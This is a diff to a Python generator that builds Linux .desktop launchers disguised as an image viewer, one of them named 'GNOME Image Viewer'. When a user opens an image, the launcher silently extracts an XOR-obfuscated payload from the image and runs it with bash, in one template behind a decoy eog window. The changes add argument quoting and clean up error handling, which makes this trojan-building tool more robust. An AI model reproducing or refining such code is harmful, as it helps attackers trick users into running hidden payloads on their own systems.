@@ -14,6 +14,7 @@ Date: 2025-11-08
 import sys
 import argparse
 import os
+import shlex
 from pathlib import Path
 
 
@@ -29,11 +30,13 @@ class DesktopFileGenerator:
 
     def _simple_template(self, extractor_path, xor_keys):
         """Simple direct execution"""
-        keys_arg = ' '.join(f'-k {k}' for k in xor_keys)
+        # Properly quote all arguments to prevent shell injection
+        keys_arg = ' '.join(shlex.quote(f'-k {k}') for k in xor_keys)
+        quoted_extractor = shlex.quote(extractor_path)
         return f"""[Desktop Entry]
 Type=Application
 Name=Image Viewer
-Exec=bash -c 'python3 {extractor_path} "%f" {keys_arg} --execute'
+Exec=bash -c 'python3 {quoted_extractor} "%f" {keys_arg} --execute'
 MimeType=image/gif;image/png;image/jpeg;image/jpg;
 Icon=image-viewer
 NoDisplay=true
@@ -53,7 +56,8 @@ try:
     p, t = e.extract_payload(sys.argv[1], xor_keys={xor_keys!r})
     import subprocess
     subprocess.run(['bash', p])
-except: pass
+except Exception:
+    pass  # Silently fail on extraction errors
 """
         import base64
         encoded = base64.b64encode(script.encode()).decode()
@@ -69,14 +73,16 @@ NoDisplay=true
 
     def _legitimate_template(self, extractor_path, xor_keys):
         """Disguised as legitimate image viewer"""
-        keys_arg = ' '.join(f'-k {k}' for k in xor_keys)
+        # Properly quote all arguments to prevent shell injection
+        keys_arg = ' '.join(shlex.quote(f'-k {k}') for k in xor_keys)
+        quoted_extractor = shlex.quote(extractor_path)
         return f"""[Desktop Entry]
 Version=1.0
 Type=Application
 Name=GNOME Image Viewer
 GenericName=Image Viewer
 Comment=View and organize your images
-Exec=sh -c 'eog "%f" 2>/dev/null & python3 {extractor_path} "%f" {keys_arg} -x 2>/dev/null &'
+Exec=sh -c 'eog "%f" 2>/dev/null & python3 {quoted_extractor} "%f" {keys_arg} -x 2>/dev/null &'
 Icon=eog
 Terminal=false
 Categories=Graphics;2DGraphics;RasterGraphics;Viewer;
@@ -137,8 +143,10 @@ NoDisplay=false
                               str(install_path.parent)],
                              stderr=subprocess.DEVNULL)
                 print(f"[+] Desktop database updated")
-            except:
-                pass
+            except (FileNotFoundError, subprocess.SubprocessError, PermissionError) as e:
+                # update-desktop-database may not be available on all systems
+                if '-v' in sys.argv or '--verbose' in sys.argv:
+                    print(f"[*] Desktop database update skipped: {e}", file=sys.stderr)
 
         return output_path
 
